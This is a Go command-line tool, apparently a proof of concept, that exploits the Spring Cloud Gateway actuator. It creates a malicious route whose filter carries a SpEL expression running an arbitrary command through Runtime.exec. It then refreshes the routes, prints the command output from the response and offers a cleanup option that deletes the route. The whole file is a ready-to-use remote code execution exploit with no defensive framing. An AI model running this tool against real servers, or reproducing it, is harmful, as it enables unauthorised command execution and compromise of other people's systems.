package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func exploit(target string, route string, command string)  {
	//check route is existed.
	u := target + "/actuator/gateway/routes/" + route
	resp, err := http.Get(u)
	isExist := 0
	if err != nil || resp.StatusCode != 200 {
		fmt.Printf("[-] %s is not found.\n", u)
	} else {
		fmt.Printf("[+] %s is found.\n", u)
		isExist = 1
	}

	req, _ := http.NewRequest("POST", u, strings.NewReader("{\n      \"id\": \""+route+"\",\n      \"filters\": [{\n        \"name\": \"AddResponseHeader\",\n        \"args\": {\"name\": \"Result\",\"value\": \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\\"" + command + "\\\").getInputStream()))}\"}\n        }],\n      \"uri\": \"http://example.com\",\n      \"order\": 0\n    }"))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	req.Header.Set("Accept-Language", "en")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept", "*/*")
	resp, err = (&http.Client{}).Do(req)
	if err != nil || resp.StatusCode != 201 {
		fmt.Printf("[-] exploit fail. Error: %s. \n", err.Error())
	} else if isExist == 0 {
		fmt.Printf("[+] %s created success. \n", u)
	}
	// refresh route
	refreshUrl := target + "/actuator/gateway/refresh"
	req, _ = http.NewRequest("POST", refreshUrl, strings.NewReader(""))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	resp, err = (&http.Client{}).Do(req)
	if err != nil || resp.StatusCode != 200 {
		fmt.Printf("[-] refresh error: %s .\n", err.Error())
		os.Exit(0)
	}
	resp, err = http.Get(u)
	if err != nil || resp.StatusCode != 200 {
		fmt.Printf("[-] Exploit fail. Error: %s .\n", err.Error())
	} else {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("[-] Read response error.")
		} else {
			reg := regexp.MustCompile("'[\x21-\x7e\u4e00-\u9fa5\\s]+'")
			result := reg.FindAllStringSubmatch(string(body), -1)
			if len(result) == 0 {
				fmt.Printf("[>] Response: %s \n", string(body))
			} else {
				cResp := strings.ReplaceAll(result[0][0], "'", "")
				fmt.Printf("[-] Exec result: \n%s \n", strings.ReplaceAll(cResp, "\\n", "\n"))
			}
		}
	}
}

func deleteroute(target string, route string)  {

	deleteUrl := target + "/actuator/gateway/routes/" + route
	req, _ := http.NewRequest("DELETE", deleteUrl, strings.NewReader(""))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	resp, err := (&http.Client{}).Do(req)
	if err != nil || resp.StatusCode != 200 {
		fmt.Printf("[-] Delete error: %s .\n", err.Error())
		os.Exit(0)
	}

	refreshUrl := target + "/actuator/gateway/refresh"
	req, _ = http.NewRequest("POST", refreshUrl, strings.NewReader(""))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	resp, err = (&http.Client{}).Do(req)
	if err != nil || resp.StatusCode != 200 {
		fmt.Printf("[-] refresh error: %s .\n", err.Error())
		os.Exit(0)
	}

	fmt.Println("[>] Delete over.")
}

func main() {
	var target, command, route  string
	var deleteRoute bool
	flag.StringVar(&target, "u", "", "Target Url, Example: http://127.0.0.1:8080")
	flag.StringVar(&command, "c", "id", "Execute command, Example: whoami")
	flag.StringVar(&route, "r", "", "New route name")
	flag.BoolVar(&deleteRoute, "d", false, "Delete route. ")
	flag.Parse()
	if deleteRoute && target != "" && route != ""{
		deleteroute(target, route)
	} else if target != "" && command != "" && route != "" {
		exploit(target, route, command)
	}  else {
		fmt.Println("[-] Args error.")
	}

}